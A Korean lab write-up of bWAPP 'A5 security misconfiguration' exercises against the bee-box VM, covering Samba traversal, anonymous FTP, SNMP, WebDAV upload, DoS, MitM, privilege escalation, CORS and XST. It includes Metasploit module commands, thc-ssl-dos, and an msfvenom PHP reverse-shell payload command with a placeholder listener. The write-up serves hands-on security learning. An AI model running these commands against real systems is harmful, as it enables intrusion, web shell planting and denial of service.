bwapp A5 — 보안 설정 오류

"해킹을 당하는 게 아니라 문을 열어놔서 들어오는 것" — 코드 문제가 아니라 잘못된 설정 때문에 생기는 취약점들 (bee-box 대상)

파일 접근 관련

Arbitrary File Access (Samba)

Samba 설정이 잘못돼 인증 없이 임의 파일 접근 가능. Metasploit로 samba 익스플로잇 실행 → 심링크 취약점 모듈로 tmp 공유폴더의 심링크를 타고 /etc/passwd까지 서버 전체 파일시스템 접근 성공.

search samba type:exploit
use auxiliary/admin/smb/samba_symlink_traversal
smbclient //IP/tmp

Old, Backup & Unreferenced Files / Robots File

예전 파일·백업 파일이 남아있어 직접 경로로 접근 가능한 문제, robots.txt에 숨긴 관리자 경로가 오히려 노출되는 문제.

서비스 설정 오류

Insecure FTP Configuration

anonymous 로그인이 가능하고 과도한 권한이 부여된 FTP. 와이어샤크로 확인하면 로그인 계정이 암호화 없이 그대로 노출. Metasploit ftp_login 모듈로 무차별 대입도 실습.

Insecure SNMP Configuration

기본 커뮤니티 스트링(public)이 그대로라 인증 없이 장비 정보 조회 가능.

snmpwalk -Os -c public -v 1 [IP]
use auxiliary/scanner/snmp/snmp_enum

Insecure WebDAV Configuration

WebDAV(HTTP 확장으로 파일 업로드/수정/삭제 가능하게 만든 프로토콜) 설정이 취약해 인증 없이 PUT 메소드로 파일 업로드 가능. Burp Suite로 PUT 요청 전송, cadaver 클라이언트로 웹쉘 업로드까지 성공.

서비스 거부 (DoS)

Large Chunk Size / Slow HTTP DoS

청크 크기 제한 없이 처리하거나, 요청을 일부러 천천히 보내 연결 슬롯을 고갈시켜 서비스를 마비시키는 유형.

SSL-Exhaustion

SSL 핸드셰이크는 서버 쪽 연산 부담이 훨씬 크다는 비대칭성을 악용, 핸드셰이크 요청을 반복해서 서버 CPU를 고갈시킴.

thc-ssl-dos [IP] 443 --accept

XML Bomb (Billion Laughs)

XML 엔티티가 중첩 확장되도록 만들어, 1~2KB 파일이 파싱 시 수 GB로 폭발해 메모리를 고갈시키는 공격.

중간자 공격 (MitM)

HTTP / SMTP MitM

HTTP는 암호화가 없어 가로채면 로그인 정보가 평문 노출. SMTP(메일 전송) 통신도 동일하게 가로채면 이메일 내용 노출·조작 가능.

권한 상승

Local Privilege Escalation (sendpage / udev)

sendpage(CVE-2009-2692) — 커널 NULL 포인터 역참조 버그로 root 권한 획득. msfvenom으로 PHP 웹쉘을 생성해 FTP anonymous로 업로드, 리버스 쉘 연결 후 sendpage 모듈 시도.
udev(CVE-2009-1185) — 장치 관리 데몬이 외부 입력을 검증하지 않는 취약점으로 root 권한 상승.

msfvenom -p php/meterpreter/reverse_tcp lhost=[IP] lport=4445 > hack.php
nmap [IP] -p 21 --script ftp-anon.nse

CORS / XST 취약점

CORS 취약점

다른 출처(Origin)의 AJAX 요청을 브라우저가 차단해야 하는데 허용해버리는 설정 오류. 공격자 서버를 열어 피해자 사이트 데이터를 가져올 수 있는지 테스트.

XST (Cross-Site Tracing)

HTTP TRACE 메소드를 악용해 HttpOnly 쿠키까지 탈취. XSS로 스크립트를 심고 TRACE 요청을 유발하면, 서버가 쿠키 포함된 요청을 그대로 반환해 HttpOnly 보호가 우회됨.

nmap [IP] -p 80 --script http-methods

TRACE 메소드 활성화 여부를 nmap으로 확인 → Burp Suite로 GET을 TRACE로 바꿔 전송해 응답에 쿠키가 포함되는지 확인.
